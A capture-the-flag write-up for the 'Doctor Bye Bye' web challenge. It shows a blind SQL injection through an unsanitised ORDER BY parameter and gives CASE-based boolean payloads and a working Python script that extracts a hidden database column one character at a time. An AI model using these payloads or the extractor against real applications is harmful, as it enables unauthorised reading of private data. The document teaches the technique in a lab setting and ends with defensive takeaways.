# Doctor Bye Bye

| Field | Value |
|---|---|
| Platform | FortID CTF |
| Category | Web |
| Challenge files | [`app.py`](app.py), [`extract.py`](extract.py) |
| Status | Solved (verified on a local copy) |
| Flag | Omitted |

## Challenge overview

The site is a hospital "on-call board". The front page calls one endpoint, `/api/on-call?sort=name`, and shows the doctor that comes back. The story says Dr. Bye Bye has retired and that "private personnel records are never displayed". The flag is exactly that private record.

Looking at `app.py`, every doctor lives in one SQLite table. Five doctors are listed, and the retired one holds the flag in `farewell_note`:

```python
INSERT INTO doctors VALUES
    (10, 'ada-pulse',   'Dr. Ada Pulse',   'Cardiology', 'C-101', 1, NULL),
    (30, 'max-well',    'Dr. Max Well',    'Radiology',  'R-204', 1, NULL),
    (50, 'paige-turner','Dr. Paige Turner','Neurology',  'N-303', 1, NULL),
    (70, 'ella-ment',   'Dr. Ella Ment',   'Pathology',  'P-118', 1, NULL),
    (90, 'zoe-last',    'Dr. Zoe Last',    'Emergency medicine', 'E-001', 1, NULL);
...
INSERT INTO doctors VALUES (404, 'doctor-bye-bye', 'Dr. Bye Bye', 'Retired', '-', 0, flag)
```

The retired doctor has `listed = 0`, and the query only ever reads listed rows, so the note never leaves the server directly.

## The injection point

The endpoint builds its SQL by dropping the `sort` parameter straight into `ORDER BY`:

```python
def select_on_call(order_expression):
    query = f"""
        SELECT name, specialty, room
        FROM doctors
        WHERE listed = 1
        ORDER BY {order_expression}
        LIMIT 1
    """
```

`order_expression` comes from the query string with no quoting and no allow-list, only a length cap of 600 characters. That is a classic `ORDER BY` injection. We cannot simply add `UNION SELECT`, because the value sits in the ordering clause, but an `ORDER BY` expression is still arbitrary SQL, and that is enough for a boolean oracle.

The handler also hides all SQL errors behind a generic message, so this is a blind injection: we never see the note, we only see which doctor ends up first.

## Turning the order into a yes/no oracle

The query returns the first listed doctor after ordering. If we make the ordering depend on a yes/no question about the hidden note, the identity of that first doctor answers the question. A `CASE` expression does it:

```sql
ORDER BY CASE WHEN (<condition>) THEN id ELSE -id END
```

- when the condition is true, the rows sort by `id` ascending, so the smallest id wins: `id = 10`, **Dr. Ada Pulse**;
- when it is false, the rows sort by `-id`, so the largest id wins: `id = 90`, **Dr. Zoe Last**.

So "the board shows Dr. Ada Pulse" means true, and "the board shows Dr. Zoe Last" means false. The condition can reference the retired row through a subquery, which is independent of the outer `WHERE listed = 1`:

```sql
(SELECT farewell_note FROM doctors WHERE id = 404)
```

## Reading the note

With a boolean oracle, the rest is standard blind extraction. First the length:

```sql
length((SELECT farewell_note FROM doctors WHERE id = 404)) <= N
```

Increase `N` until the answer flips to true, and that `N` is the length. Then each character by binary search on its code point (the flag is printable ASCII, 32 to 126):

```sql
unicode(substr((SELECT farewell_note FROM doctors WHERE id = 404), POS, 1)) <= MID
```

Each question is one request to `/api/on-call`, and seven questions pin down one character. The full extractor is [`extract.py`](extract.py); the core is short:

```python
SECRET = "(SELECT farewell_note FROM doctors WHERE id=404)"

def ask(condition):
    sort = f"CASE WHEN {condition} THEN id ELSE -id END"
    url = f"{BASE}/api/on-call?sort=" + quote(sort, safe="")
    with urlopen(url, timeout=10) as response:
        return json.load(response)["doctor"]["name"] == "Dr. Ada Pulse"

length = 1
while not ask(f"length({SECRET}) <= {length}"):
    length += 1

flag = ""
for position in range(1, length + 1):
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        if ask(f"unicode(substr({SECRET},{position},1)) <= {mid}"):
            high = mid
        else:
            low = mid + 1
    flag += chr(low)
```

## Running it

The script takes the base address as its only argument (no trailing `/api/on-call`, just the host):

```sh
python extract.py http://127.0.0.1:8080
```

Against a live instance, use the address the instancer gives you:

```sh
python extract.py https://doctor-bye-bye-<id>.inst<n>.ctf.fortid.com
```

It prints the note one character longer each round and ends with the full flag. Verified end to end on a local copy of the service seeded with a placeholder flag, where it reproduced that placeholder exactly.

## Takeaways

- A value placed in `ORDER BY` is still injectable even though `UNION`-style extraction does not apply there. An expression is enough.
- You do not need the secret to be printed. Any attacker-controlled branch that changes an observable result (here, which doctor sorts first) is a one-bit oracle, and one bit at a time is enough to read a whole column.
- Hiding SQL errors behind a generic message slows an attacker down but does not close a blind-injection channel.
- Row-level visibility flags (`listed = 1`) do not protect a value if the query lets you reference the hidden row from a subquery in a clause you control.
